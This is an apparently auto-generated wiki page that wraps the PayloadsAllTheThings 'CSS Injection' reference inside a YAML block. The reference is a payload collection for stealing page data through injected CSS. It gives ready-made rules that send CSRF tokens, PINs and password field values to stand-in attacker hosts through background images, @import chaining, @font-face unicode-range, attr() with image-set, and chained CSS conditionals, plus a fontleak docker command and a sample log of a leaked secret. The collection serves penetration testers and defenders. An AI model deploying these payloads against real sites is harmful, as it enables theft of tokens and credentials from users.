---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# CSS Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-css-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CSS Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CSS Injection](../../topics/css-injection/css-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-css-injection-readme |
| name | CSS Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSS%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# CSS Injection\n\n> CSS Injection is a vulnerability that occurs when an application allows untrusted CSS to be injected\
  \ into a web page. This can be exploited to exfiltrate sensitive data, such as CSRF tokens or other secrets, by manipulating\
  \ the page layout or triggering network requests based on element attributes.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n\
  \    * [CSS Selectors](#css-selectors)\n    * [CSS Import at-rule](#css-import-at-rule)\n    * [CSS Conditionals](#css-conditionals)\n\
  \    * [CSS Font-face at-rule](#css-font-face-at-rule)\n    * [Attribute Extraction via attr()](#attribute-extraction-via-attr)\n\
  \    * [Ligatures](#ligatures)\n* [Labs](#labs)\n* [References](#references)\n\n## Tools\n\n* [hackvertor/blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration)\
  \ - A tool to exfiltrate unknown web pages using Blind CSS.\n* [PortSwigger/css-exfiltration](https://github.com/PortSwigger/css-exfiltration)\
  \ - Collection of CSS based exfiltration techniques.\n* [cgvwzq/css-scrollbar-attack](https://github.com/cgvwzq/css-scrollbar-attack)\
  \ - PoC for leaking text nodes via CSS injection using scrollbars.\n* [d0nutptr/sic](https://github.com/d0nutptr/sic) -\
  \ Sequential Import Chaining for advanced CSS exfiltration.\n* [adrgs/fontleak](https://github.com/adrgs/fontleak) - Tool\
  \ for fast exfiltration of text using only CSS and Ligatures.\n\n## Methodology\n\n### CSS Selectors\n\nCSS selectors can\
  \ be used to exfiltrate data. This technique is particularly useful because CSS is often allowed in CSP rules, whereas JavaScript\
  \ is frequently blocked.\n\nThe attack works by brute-forcing a token character by character. Once the first character is\
  \ identified, the payload is updated to guess the second character, and so on. This often requires an iframe to reload the\
  \ page with the new payload.\n\n* `input[value^=a]` (prefix attribute selector): Selects elements where the value starts\
  \ with \"a\".\n* `input[value$=a]` (suffix attribute selector): Selects elements where the value ends with \"a\".\n* `input[value*=a]`\
  \ (substring attribute selector): Selects elements where the value contains \"a\".\n\n#### Exfiltration via Background Image\n\
  \nWhen a selector matches, the browser attempts to load the background image from a URL controlled by the attacker, thereby\
  \ leaking the character.\n\n```css\ninput[value^=\"TOKEN_012\"] {\n  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);\n\
  }\n```\n\n```css\ninput[name=\"pin\"][value=\"1234\"] {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);\n\
  }\n```\n\n**Tips:**\n\n* **Hidden Inputs**: You cannot apply a background image directly to a hidden input field. Instead,\
  \ use a sibling selector (`+` or `~`) to style a visible element that appears after the hidden input.\n\n```css\ninput[name=\"\
  csrf-token\"][value^=\"a\"] + input {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)\n}\n```\n\n* **Has Selector**:\
  \ The `:has()` pseudo-class allows styling a parent element based on its children.\n\n```css\ndiv:has(input[value=\"1337\"\
  ]) {\n  background:url(/collectData?value=1337);\n}\n```\n\n* **Concurrency**: Use both prefix and suffix selectors to speed\
  \ up the guessing process. You can assign the prefix check to one property (e.g., `background`) and the suffix check to\
  \ another (e.g., `list-style-image` or `border-image`).\n\n### CSS Import at-rule\n\nThis technique is known as **Blind\
  \ CSS Exfiltration**. It relies on importing external stylesheets to trigger callbacks.\n\n```html\n<style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>\n\
  <style>@import'//[ATTACKER.DOMAIN.TLD]'</style>\n```\n\nFrames do not always need to be reloaded to reevaluate CSS. The\
  \ `@import` rule allows for latency; the browser will process the import and apply the new styles.\n\n#### Sequential Import\
  \ Chaining (SIC)\n\nSIC allows an attacker to chain multiple extraction steps without reloading the page:\n\n1. Inject an\
  \ initial `@import` rule pointing to a staging payload.\n2. The staging payload holds the connection open (long-polling)\
  \ while generating the next specific payload.\n3. When a CSS rule matches (e.g., a character is found via `background-image`),\
  \ the browser makes a request.\n4. The server detects this request and generates the next `@import` rule to continue the\
  \ chain.\n\n### CSS Conditionals\n\n#### Inline Style Exfiltration\n\nThis advanced technique leverages CSS conditionals\
  \ (like `if()`) and variables to perform logic directly within a style attribute.\n\nExample: Stealing a `data-uid` attribute\
  \ if it matches a value between 1 and 10.\n\n```html\n<div style='--val: attr(data-uid); --steal: if(style(--val:\"1\"):\
  \ url(/1); else: if(style(--val:\"2\"): url(/2); else: if(style(--val:\"3\"): url(/3); else: if(style(--val:\"4\"): url(/4);\
  \ else: if(style(--val:\"5\"): url(/5); else: if(style(--val:\"6\"): url(/6); else: if(style(--val:\"7\"): url(/7); else:\
  \ if(style(--val:\"8\"): url(/8); else: if(style(--val:\"9\"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));'\
  \ data-uid='1'></div>\n```\n\n### CSS Font-face at-rule\n\n> The @font-face CSS at-rule specifies a custom font with which\
  \ to display text; the font can be loaded from either a remote server or a locally-installed font on the user's own computer.\
  \ - Mozilla\n\nThe `unicode-range` property allows specific fonts to be used for specific characters. We can abuse this\
  \ to detect if a specific character is present on the page.\n\nIf the character \"A\" is present, the browser attempts to\
  \ load the font from `/?A`. If \"C\" is not present, that request is never made.\n\n```html\n<style>\n@font-face{ font-family:poc;\
  \ src: url(http://attacker.example.com/?A); /* fetched */ unicode-range:U+0041; }\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?B);\
  \ /* fetched too */ unicode-range:U+0042; }\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); /* not\
  \ fetched */ unicode-range:U+0043; }\n#sensitive-information{ font-family:poc; }\n</style>\n<p id=\"sensitive-information\"\
  >AB</p>\n```\n\n**Limitations:**\n\n* It cannot distinguish repeated characters (e.g., \"AA\" triggers the request once).\n\
  * It does not determine the order of characters.\n* Despite these limitations, it is a very reliable oracle for checking\
  \ character existence.\n* Chrome checked this as \"WontFix\": [issues/40083029](https://issues.chromium.org/issues/40083029)\n\
  \n### Attribute Extraction via attr()\n\nThe CSS `attr()` function allows CSS to retrieve the value of an attribute of the\
  \ selected element.  With recent updates (see [Advanced attr()](https://developer.chrome.com/blog/advanced-attr)), this\
  \ function can be used to extract input's value.\n\nTarget HTML:\n\n```html\n<html>\n    <head>\n        <link rel=\"stylesheet\"\
  \ href=\"http://attacker.local/index.css\">\n    </head>\n    <body>\n        <input type=\"text\" name=\"password\" value=\"\
  supersecret\">\n    </body>\n</html>\n```\n\n`index.css` (hosted by attacker):\n\n```css\ninput[name=\"password\"] {\n \
  \ background: image-set(attr(value))\n}\n```\n\nWhen `image-set()` is used with `attr()`, the browser may attempt to interpret\
  \ the attribute value as a URL. If the stylesheet is cross-domain, the relative URL is resolved against the stylesheet's\
  \ origin, not the page's origin.\n\nResulting request on attacker's server:\n\n```ps1\n10.10.10.10 - - [15/Feb/2026 16:33:21]\
  \ \"GET /supersecret HTTP/1.1\" 404 -\n```\n\n### Ligatures\n\nThis technique exploits custom fonts and ligatures. A ligature\
  \ combines multiple characters into a single glyph. By creating a custom font where specific character sequences (e.g.,\
  \ specific text content) produce a ligature with a huge width, we can detect the change in layout.\n\n1. Create a custom\
  \ font with ligatures for target strings.\n2. Use media queries or scrollbars to detect if the rendered width of the element\
  \ has changed.\n\n```ps1\ndocker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest\n\
  ```\n\nPayload example using `fontleak` with a custom selector, parent element, and alphabet.\n**Warning**: The CSS selector\
  \ must match exactly one element in the target page.\n\n```html\n<style>@import url(\"http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789\"\
  );</style>\n```\n\n## Labs\n\n* [Dojo #25 RootCSS - YesWeHack](https://dojo-yeswehack.com/challenge-of-the-month/dojo-25)\n\
  \n## References\n\n* [0CTF 2023 Writeups - Web - newdiary - aszx87410 - December 11, 2023](https://web.archive.org/web/20260208112931/https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/)\n\
  * [Bench Press: Leaking Text Nodes with CSS - pspaul - October 20, 2024](https://web.archive.org/web/20250809122224/https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/)\n\
  * [Better Exfiltration via HTML Injection - d0nut - April 11, 2019](https://web.archive.org/web/20260206153955/https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)\n\
  * [Blind CSS Exfiltration: exfiltrate unknown web pages - Gareth Heyes - December 5, 2023](https://web.archive.org/web/20231205201432/https://portswigger.net/research/blind-css-exfiltration)\n\
  * [CSS based Attack: Abusing unicode-range of @font-face - Masato Kinugawa - October 23, 2015](https://web.archive.org/web/20260212042745/https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)\n\
  * [CSS Data Exfiltration to Steal OAuth Token - - September 13, 2025](https://web.archive.org/web/20250601232405/https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)\n\
  * [CSS Injection - xsleaks.dev - May 9, 2025](https://web.archive.org/web/20260114161847/https://xsleaks.dev/docs/attacks/css-injection/)\n\
  * [CSS Injection Attacks or how to leak content with <style> - Pepe Vila - September 28, 2025](https://web.archive.org/web/20250928084357/https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)\n\
  * [CSS Injection: Attacking with Just CSS (Part 2) - aszx87410 - September 24, 2023](https://web.archive.org/web/20231223213409/https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/)\n\
  * [Fontleak: exfiltrating text using CSS and Ligatures - Dragos Albastroiu - April 16, 2025](https://web.archive.org/web/20251130021102/https://adragos.ro/fontleak/)\n\
  * [How you can steal private data through CSS injection - invicti - April 23, 2018](https://web.archive.org/web/20251107094938/https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)\n\
  * [Inline Style Exfiltration: leaking data with chained CSS conditionals - Gareth Heyes - August 26, 2025](https://web.archive.org/web/20260226022330/https://portswigger.net/research/inline-style-exfiltration)"
_relative_path: CSS Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CSS Injection/README.md
````
